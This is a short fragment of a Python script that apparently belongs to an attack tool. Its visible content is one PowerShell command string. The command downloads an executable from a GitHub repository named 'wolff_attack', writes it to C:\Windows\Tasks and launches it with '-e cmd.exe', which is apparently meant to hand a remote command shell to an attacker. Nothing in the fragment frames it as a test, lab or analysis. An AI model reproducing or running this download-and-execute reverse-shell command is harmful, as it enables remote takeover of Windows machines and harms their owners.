...
def main(args):
    ...
    command = f"""Invoke-WebRequest https://github.com/ragvu/wolff_attack/blob/main/wolff.exe?raw=true -OutFile C:\\Windows\\Tasks\\wolf.exe; C:\\Windows\\Tasks\\wolf.exe -e cmd.exe"""
